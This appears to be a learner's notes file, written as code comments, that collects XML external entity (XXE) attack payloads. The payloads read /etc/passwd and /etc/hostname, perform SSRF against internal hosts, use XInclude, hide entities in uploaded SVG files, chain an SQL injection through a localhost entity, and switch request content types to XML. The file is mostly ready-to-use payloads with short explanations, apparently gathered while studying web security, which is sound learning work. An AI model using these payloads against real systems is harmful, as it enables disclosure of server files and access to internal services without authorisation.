//* Exploiting XXE to retrieve files
//from
// <?xml version="1.0" encoding="UTF-8"?>
// <stockCheck><productId>381</productId></stockCheck>
// to
// <?xml version="1.0" encoding="UTF-8"?>
// <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
// <stockCheck><productId>&xxe;</productId></stockCheck>

//* Exploiting XXE to perform SSRF attacks
// <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
// if it does not get a file content if gets the folder name

// <!DOCTYPE svg [
//   <!ENTITY xxe SYSTEM "http://localhost:5000/search?q='union/**/select/**/*/**/from/**/_696fca451a1e8daf--">
// ]>
// <svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
//   <text font-size="14" x="10" y="20">&xxe;</text>
// </svg>

//* XInclude attacks (when you don't have acces to the hole document)
//<foo xmlns:xi="http://www.w3.org/2001/XInclude">
// <xi:include parse="text" href="file:///etc/passwd" />
// </foo>;
//* XXE attacks via file upload
// if the application allows you to upload svg you can include the file into the svg like this
//? <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
// <svg width="200" height="190" viewBox="0 0 200 300" fill="none" xmlns="http://www.w3.org/2000/svg">
// <path d="M5.63657 15.6873L9.66452 13.2577L13.6925 15.7192L12.6375 11.1159L16.186 8.04695L11.5187 7.63136L9.66452 3.28374L7.81038 7.5994L3.14308 8.01498L6.69151 11.1159L5.63657 15.6873ZM3.68653 18.37L5.27214 11.5762L0 7.00863L6.94469 6.40763L9.66452 0L12.3843 6.40636L19.3278 7.00735L14.0556 11.5749L15.6425 18.3687L9.66452 14.7627L3.68653 18.37Z" fill="#11416F"/>
// <text x="50" y="50" font-family="Arial" font-size="24" fill="blue">
//? &xxe;
// </text>
// </svg>

//* XXE attacks via modified content type
// if the application tolerates this you can performe any the previous attacks

// from
// POST /action HTTP/1.0
// Content-Type: application/x-www-form-urlencoded
// Content-Length: 7
// foo=bar

// to
// POST /action HTTP/1.0
// Content-Type: text/xml
// Content-Length: 52

// <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
